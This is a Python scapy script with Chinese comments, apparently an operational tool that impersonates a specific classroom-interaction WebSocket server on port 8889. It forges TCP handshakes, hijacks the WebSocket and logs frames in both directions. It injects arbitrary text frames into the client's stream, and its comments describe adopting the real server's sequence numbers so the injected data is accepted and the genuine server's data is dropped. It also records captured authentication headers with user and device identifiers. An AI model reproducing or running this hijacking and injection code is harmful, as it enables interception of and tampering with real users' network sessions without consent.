# -*- coding: utf-8 -*-
"""ws8889.py -- 链路层冒充课堂互动 WebSocket 服务(47.99.214.197:8889)。

已实测的完整握手(2026-10-04 18:58, 被动抓取):
    GET / HTTP/1.1
    Auth: {"boundId":"UXHOVJJF","role":1,"tags":["RWYZKUIF"],"userId":"2112229","v":"ztkt4"}
    DeviceId: R52N9067SSF
    Host: 47.99.214.197:8889
    Sec-WebSocket-Key: 8Y3V3Qp+PR1WE+AUi7XIyQ==
    Sec-WebSocket-Version: 13
    Upgrade: websocket / Connection: Upgrade
  ->
    HTTP/1.1 101 Switching Protocols
    sec-websocket-accept: base64(sha1(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))

本脚本:
  1) 冒充 SYNACK 完成三次握手;
  2) 解析 Upgrade 请求, 算对 accept, 回 101 -> **接管这条 WebSocket**;
  3) 按 RFC6455 解析并落盘双向帧(text/hex), 服务端->端侧的帧也一并记录;
  4) 可选注入: 把 WS_INJECT_FILE 里的内容作为 text 帧推给端侧, 观察其反应。

用法:
  python ws8889.py [watch_seconds]
  注入: 运行中把文本写进 ws_inject.txt 即会推送一次(每 5 秒检查一次)。
"""
import base64
import datetime
import hashlib
import json
import os
import random
import struct
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from scapy.all import Ether, IP, Raw, TCP, AsyncSniffer   # noqa: E402
from scapy.config import conf                            # noqa: E402

import npcap_http80 as H                                 # noqa: E402

PORT = int(os.environ.get("WS8889_PORT") or 8889)
# 只针对实测到的这个互动服务地址冒充, 避免影响其它 8889 使用者。
# ANYDST-FIX (2026-10-10 20:07): 允许"不过滤目的 IP"。
#   背景: 端侧课堂服务域名(smarterclassgray.yunzuoye.net)可能解析到 47.111.87.154 等
#   多个 IP, 写死 47.99.214.197 会漏掉连接 => 计数长期为 0。
#   现在: WS8889_ONLY_DST 设为 "*" / "any" / 空 => 不按目的 IP 过滤(只按端口 8889 捕获)。
_ONLY_RAW = (os.environ.get("WS8889_ONLY_DST") or "*").strip()
if _ONLY_RAW in ("*", "any", "ANY", "0", "-", ""):
    ONLY_DST = []
else:
    ONLY_DST = [x.strip() for x in _ONLY_RAW.split(",") if x.strip()]
WATCH = int(sys.argv[1]) if len(sys.argv) > 1 else 3600
BASE = os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(BASE, "ws8889.log")
FRAMES = os.path.join(BASE, "ws_frames.log")
INJECT = os.path.join(BASE, "ws_inject.txt")
GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

stat = {"syn": 0, "est": 0, "ws_open": 0, "frame_out": 0, "frame_in": 0, "inject": 0}
_last_ack = {}
flows = {}
_sock = None
_lock = threading.Lock()


def wlog(msg, path=None):
    line = "%s %s" % (datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3], msg)
    try:
        sys.stdout.write(line + "\n")
        sys.stdout.flush()
    except Exception:
        pass
    try:
        with open(path or LOG, "a", encoding="utf-8", errors="replace") as f:
            f.write(line + "\n")
    except Exception:
        pass


def send(frame):
    global _sock
    with _lock:
        if _sock is None:
            _sock = conf.L2socket(iface=H.iface_name())
        _sock.send(frame)


def emit(dst_ip, sport, dport, flags, seq, ack, payload=b""):
    pad = H.pad_now()
    pkt = (Ether(dst=H.PAD_MAC, src=H.ICS_MAC) /
           IP(src=dst_ip, dst=pad, ttl=64) /
           TCP(sport=sport, dport=dport, flags=flags, seq=seq, ack=ack, window=64240))
    if payload:
        pkt = pkt / Raw(payload)
    send(pkt)


# ---------- RFC6455 ----------
def ws_accept(key):
    return base64.b64encode(hashlib.sha1((key + GUID).encode()).digest()).decode()


def ws_build(opcode, payload, mask=False):
    """构造服务端->客户端帧(不掩码)。"""
    b0 = 0x80 | (opcode & 0x0F)
    n = len(payload)
    if n < 126:
        head = struct.pack("!BB", b0, n)
    elif n < 65536:
        head = struct.pack("!BBH", b0, 126, n)
    else:
        head = struct.pack("!BBQ", b0, 127, n)
    return head + payload


def ws_parse(buf):
    """从缓冲解析出若干完整帧, 返回 [(opcode, payload, consumed)]。"""
    out, i = [], 0
    while True:
        if len(buf) - i < 2:
            break
        b0, b1 = buf[i], buf[i + 1]
        opcode = b0 & 0x0F
        masked = b1 & 0x80
        ln = b1 & 0x7F
        off = i + 2
        if ln == 126:
            if len(buf) - off < 2:
                break
            ln = struct.unpack("!H", buf[off:off + 2])[0]
            off += 2
        elif ln == 127:
            if len(buf) - off < 8:
                break
            ln = struct.unpack("!Q", buf[off:off + 8])[0]
            off += 8
        mk = b""
        if masked:
            if len(buf) - off < 4:
                break
            mk = buf[off:off + 4]
            off += 4
        if len(buf) - off < ln:
            break
        pl = bytearray(buf[off:off + ln])
        if masked:
            for j in range(len(pl)):
                pl[j] ^= mk[j % 4]
        out.append((opcode, bytes(pl), off + ln - i))
        i = off + ln
    return out


def log_frame(direction, opcode, pl):
    name = {0x0: "cont", 0x1: "text", 0x2: "binary", 0x8: "close",
            0x9: "ping", 0xA: "pong"}.get(opcode, "op%d" % opcode)
    txt = pl.decode("utf-8", "replace")
    wlog("### [%s] WS %s len=%d\n--- text ---\n%s\n--- hex ---\n%s" % (
        direction, name, len(pl), txt[:2000], pl[:600].hex()), FRAMES)


def on_pkt(p):
    try:
        if not (p.haslayer(TCP) and p.haslayer(IP)):
            return
        ip, t = p[IP], p[TCP]
        pad = H.pad_now()
        if ip.src != pad or t.dport != PORT:
            return
        server = ip.dst
        if ONLY_DST and server not in ONLY_DST:
            return
        key = (server, t.sport)
        f = flows.get(key)
        pl = bytes(t.payload) if t.payload else b""

        if t.flags & 0x02 and not t.flags & 0x10:      # SYN
            isn = random.randint(0x40000000, 0x7FFFFFFF)
            flows[key] = {"next": (t.seq + 1) & 0xFFFFFFFF,
                          "mine": (isn + 1) & 0xFFFFFFFF, "est": False,
                          "buf": b"", "ws": False, "wsbuf": b""}
            stat["syn"] += 1
            emit(server, PORT, t.sport, "SA", isn, (t.seq + 1) & 0xFFFFFFFF)
            wlog("SYN %s:%d <- %s:%d -> SYNACK" % (server, PORT, pad, t.sport))
            return

        if f is None:
            return
        if t.flags & 0x04:
            flows.pop(key, None)
            return
        if not f["est"] and t.flags & 0x10:
            f["est"] = True
            stat["est"] += 1
            wlog("ESTABLISHED %s:%d <-> %s:%d" % (server, PORT, pad, t.sport))

        # ★★★ ACK-RECON (2026-10-17): 端侧是否确认了我们注入的数据 —— 一次判定
        #     "帧发出去但端侧不处理" 到底是 ①(帧没进端侧协议栈) 还是 ②(进了但业务层丢弃)。
        #   若 ack == mine => 端侧已收到我们的注入字节 => 属于 ②(业务层问题)
        #   若 ack 落后于 mine => 我们的注入没被确认 => 属于 ①(投递问题)
        if (t.flags & 0x10) and not pl:
            try:
                _a = t.ack
                _m = f["mine"]
                if _last_ack.get(key) != _a:
                    _last_ack[key] = _a
                    _d = (_m - _a) & 0xFFFFFFFF
                    wlog("[ACK] 端侧ack=%u 我们mine=%u %s" % (
                        _a, _m,
                        "OK(端侧已确认我们注入的数据)" if _a == _m
                        else "落后(未确认我们注入的数据, 差 %d)" % _d))
            except Exception:
                pass

        # ★★★ SEQ-ADOPT (2026-10-17): **采用真服务器的序号空间**
        #   实测(ACK 诊断): 端侧跟**真服务器**完成了三次握手(端侧 ACK 与我们自造的 ISN 相差 ~1.9G)
        #   => 我们此前用自造 ISN 注入的帧全部"越窗"被端侧丢弃 => 这就是"帧发了但端侧不处理"的真因。
        #   修法: 用「端侧最后一次 ACK(= 端侧期望的下一个字节)」当 seq 注入,
        #         并用「端侧的下一个 seq」当 ack; 注入后再把这个期望值往前推。
        #   => 端侧会把这帧当作真服务器发来的数据接收; 真服务器随后同序号的数据反被当重复丢弃。
        try:
            if t.ack:
                f["srv_next"] = t.ack            # 端侧期望从"服务器"收到的下一个字节
        except Exception:
            pass

        if pl:
            f["next"] = (t.seq + len(pl)) & 0xFFFFFFFF
            f["buf"] += pl
            emit(server, PORT, t.sport, "A", f["mine"], f["next"])

            if not f["ws"]:
                i = f["buf"].find(b"\r\n\r\n")
                if i < 0:
                    return
                head = f["buf"][:i].decode("utf-8", "replace")
                f["buf"] = f["buf"][i + 4:]
                wlog("=== WebSocket Upgrade 请求 ===\n%s" % head)
                accept = ""
                for ln in head.split("\r\n"):
                    if ln.lower().startswith("sec-websocket-key:"):
                        accept = ws_accept(ln.split(":", 1)[1].strip())
                resp = ("HTTP/1.1 101 Switching Protocols\r\n"
                        "Upgrade: websocket\r\n"
                        "Connection: Upgrade\r\n"
                        "Sec-WebSocket-Accept: %s\r\n\r\n" % accept).encode()
                emit(server, PORT, t.sport, "PA", f["mine"], f["next"], resp)
                f["mine"] = (f["mine"] + len(resp)) & 0xFFFFFFFF
                f["ws"] = True
                stat["ws_open"] += 1
                wlog("=== 已接管 WebSocket, accept=%s ===" % accept)
                if not f["buf"]:
                    return
            # WS 帧
            f["wsbuf"] += f["buf"]
            f["buf"] = b""
            frames = ws_parse(f["wsbuf"])
            if frames:
                f["wsbuf"] = f["wsbuf"][sum(c for _, _, c in frames):]
            for opcode, payload, _c in frames:
                stat["frame_in"] += 1
                log_frame("端侧->我们", opcode, payload)
                if opcode == 0x9:                       # ping -> pong
                    d = ws_build(0xA, payload)
                    emit(server, PORT, t.sport, "PA", f["mine"], f["next"], d)
                    f["mine"] = (f["mine"] + len(d)) & 0xFFFFFFFF
                elif opcode == 0x8:
                    wlog("端侧发来 close 帧")
        elif t.flags & 0x01:
            emit(server, PORT, t.sport, "FA", f["mine"], (t.seq + 1) & 0xFFFFFFFF)
            flows.pop(key, None)
        else:
            emit(server, PORT, t.sport, "A", f["mine"], f["next"])
    except Exception as e:
        wlog("ERR %s %s" % (type(e).__name__, e))


def injector():
    """把 ws_inject.txt 的内容作为 text 帧推给已接管的 WebSocket。

    INJECT-PER-FLOW (2026-10-10 18:42 修复):
      旧逻辑只在"文件内容变化时"推送一次 => 文件早写好、内容没变时,
      **新接管的连接永远收不到信封**(实测 inject=0 而 ws_open=4)。
      新逻辑: 每条新接管的 ws 流各推一次(记录已推送的流 key); 文件内容变化时对所有流重推。
    """
    last = ""
    done = set()
    while True:
        time.sleep(3)
        try:
            if not os.path.exists(INJECT):
                continue
            txt = open(INJECT, encoding="utf-8").read()
            if not txt:
                continue
            changed = (txt != last)
            if changed:
                last = txt
                done = set()          # 内容变了 => 允许重新推给所有流
            payload = txt.encode("utf-8")
            n = 0
            for key, f in list(flows.items()):
                if not f.get("ws"):
                    continue
                if key in done:
                    continue
                server, sport = key
                d = ws_build(0x1, payload)
                # ★ SEQ-ADOPT: 优先用"端侧期望的服务器序号"(真服务器序号空间) ⇒ 保证在窗口内
                _use = f.get("srv_next")
                if not _use:
                    _use = f["mine"]
                emit(server, PORT, sport, "PA", _use, f["next"], d)
                f["mine"] = (f["mine"] + len(d)) & 0xFFFFFFFF
                f["srv_next"] = (_use + len(d)) & 0xFFFFFFFF
                done.add(key)
                n += 1
                log_frame("我们->端侧(注入 seq-adopt)", 0x1, payload)
            if n:
                stat["inject"] += n
                wlog("### 注入 %d 条新连接, %d B (累计已注入流=%d)" % (n, len(payload), len(done)), FRAMES)
        except Exception as e:
            wlog("inject ERR %s" % e)


def main():
    wlog("===== ws8889 start %s port=%d only_dst=%s watch=%ds =====" % (
        datetime.datetime.now(), PORT, ONLY_DST, WATCH))
    try:
        wlog("iface=%s pad=%s" % (H.iface_name(), H.pad_now()))
    except Exception as e:
        wlog("iface/pad ERR %r" % (e,))
    threading.Thread(target=injector, daemon=True).start()

    # ★★★ SNIFF-RETRY (2026-10-17): 抓包线程此前会**静默失败**(只写启动行、没有 stat)
    #     这是 ws8889 反复"卡死"的真因。改为: 重试 5 次 + 把异常写进日志, 并保持心跳。
    sn = None
    for _try in range(1, 6):
        try:
            sn = AsyncSniffer(iface=H.iface_name(), store=False, prn=on_pkt,
                              filter="tcp and port %d" % PORT)
            sn.start()
            wlog("[SNIFF] started (try=%d) filter='tcp and port %d'" % (_try, PORT))
            break
        except Exception as e:
            wlog("[SNIFF-ERR] try=%d %r" % (_try, e))
            time.sleep(3)
    if sn is None:
        wlog("[SNIFF-FATAL] 抓包启动失败 => 只做心跳(请检查网卡/驱动)")

    t0 = time.time()
    while time.time() - t0 < WATCH:
        time.sleep(10)
        try:
            wlog("[stat] %s" % json.dumps(stat, ensure_ascii=False))
        except Exception:
            pass
    try:
        if sn is not None:
            sn.stop()
    except Exception:
        pass


if __name__ == "__main__":
    main()
